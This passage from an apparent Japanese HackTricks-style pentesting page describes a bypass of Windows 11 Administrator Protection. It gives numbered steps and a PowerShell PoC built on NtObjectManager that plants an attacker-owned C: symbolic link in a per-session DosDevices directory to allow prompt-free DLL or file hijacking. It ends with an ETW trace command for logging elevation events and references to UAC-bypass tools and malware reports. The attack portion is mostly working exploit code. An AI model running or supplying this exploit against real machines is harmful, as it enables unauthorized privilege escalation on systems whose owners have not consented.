Windows 11 25H2 の「Administrator Protection」は、セッションごとの `\Sessions\0\DosDevices/<LUID>` マップを持つ shadow-admin トークンを使用します。このディレクトリは、初回の `\??` 解決時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin トークンを **SecurityIdentification** でのみ偽装すると、ディレクトリは攻撃者を**所有者**として作成され（`CREATOR OWNER` を継承）、`\GLOBAL??` より優先されるドライブレターリンクを作成できます。<sup>[[7]](#references)</sup>

**手順:**

1. 低権限のセッションから `RAiProcessRunOnce` を呼び出し、プロンプトを表示しない shadow-admin の `runonce.exe` を起動する。
2. そのプライマリトークンを **identification** トークンに複製し、`\??` を開く際にそれを偽装して、攻撃者が所有する `\Sessions\0\DosDevices/<LUID>` を強制的に作成する。
3. そこに `C:` のシンボリックリンクを作成し、攻撃者が制御するストレージを指すようにする。このセッションで以降に行われるファイルシステムアクセスでは、`C:` が攻撃者のパスに解決され、プロンプトなしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

プレビュー ホストでは、Administrator Protection は `Microsoft-Windows-LUA` プロバイダーの ETW イベント **15031** および **15032** として承認と失敗を記録します。イベントには、要求者の SID、アプリケーションのパス、結果、管理対象の管理者アカウント、認証方法が含まれるため、exploit の繰り返し試行や UI 操作の失敗がテレメトリに記録されないわけではありません。<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – ユーザー アカウント制御の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass 手法集](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass 互換性スキャナーおよびランチャー](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI、AIを活用してPowerShell backdoorを生成](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos：東南アジア政府機関を標的とした0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip、Narrator の Always Notify bypass](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – 管理者保護](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET からローカル Windows RPC サーバーを呼び出す](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte、署名済み Windows kernel rootkit で CoolClient を強化](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT：スパイ、窃取、脅迫を目的に構築された完全に検出不能な Windows Trojan](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
